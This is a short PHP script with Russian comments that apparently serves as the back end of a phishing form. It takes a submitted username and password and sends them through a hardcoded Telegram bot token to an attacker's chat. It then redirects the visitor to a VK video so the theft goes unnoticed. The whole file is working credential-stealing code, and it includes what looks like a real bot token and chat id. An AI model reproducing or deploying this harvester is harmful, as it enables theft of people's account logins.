<?php

/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$name = $_POST['user_name'];
$phone = $_POST['user_password'];

$token = "5140197605:AAHGGrEqekHJIKy0khX4SdvOAhRgvIDKtHQ";
$chat_id = "-773907565";
$arr = array(
  'Имя пользователя: ' => $name,
  'Password: ' => $phone,

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: https://vk.com/clips709546555?z=clip709546555_456239023');
} else {
  echo "Error";
}
?>
